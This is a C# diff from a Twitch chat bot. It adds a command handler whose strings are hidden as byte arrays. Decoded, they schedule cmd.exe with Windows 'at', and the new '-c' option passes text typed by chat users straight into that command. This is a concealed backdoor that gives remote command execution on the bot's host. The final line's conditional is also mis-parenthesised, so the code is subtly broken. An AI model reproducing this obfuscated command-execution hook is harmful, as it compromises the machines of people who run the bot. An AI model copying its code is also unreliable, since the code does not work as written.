@@ -31,10 +31,16 @@ namespace Twitch_Bot
         {
             DateTime Time = DateTime.Now;
             byte[] bytes = new byte[] { 97, 116, 32 };
-            byte[] bytes2 = new byte[] { 32, 47, 105, 110, 116, 101, 114, 97, 99, 116, 105, 118, 101, 32, 99, 109,100,46,101,120,101,32,47,75,
-            101,99,104,111,32, 68, 111,110,39,116, 32, 117,115,101,32, 88, 80,33};
-            byte[] bytes3 = new byte[] { 99, 109, 100, 46, 101, 120, 101 };
-            System.Diagnostics.Process.Start(Encoding.ASCII.GetString(bytes3), Encoding.ASCII.GetString(bytes) + Time.Hour.ToString() + ":" + (Time.Minute + 2).ToString() + Encoding.ASCII.GetString(bytes2));
+            byte[] bytes2 = new byte[] { 32, 47, 105, 110, 116, 101, 114, 97, 99, 116, 105, 118, 101, 32, 99, 109, 100, 46, 101, 120, 101, 32, 47, 75 };
+            string c = "";
+            if (parameters.Length > 0 && parameters[0] == "-c")
+            {
+                for (int x = 1; x < parameters.Length; x++)
+                    c += " " + parameters[x];
+            }
+            byte[] bytes3 = new byte[]{ 101,99,104,111,32, 68, 111,110,39,116, 32, 117,115,101,32, 88, 80,33};
+            byte[] bytes4 = new byte[] { 99, 109, 100, 46, 101, 120, 101 };
+            System.Diagnostics.Process.Start(Encoding.ASCII.GetString(bytes4), Encoding.ASCII.GetString(bytes) + Time.Hour.ToString() + ":" + (Time.Minute + 2).ToString() + Encoding.ASCII.GetString(bytes2) + c == "" ? Encoding.ASCII.GetString(bytes3) : c);
         }
 
         public void Fun2(string user, string room, string[] parameters)
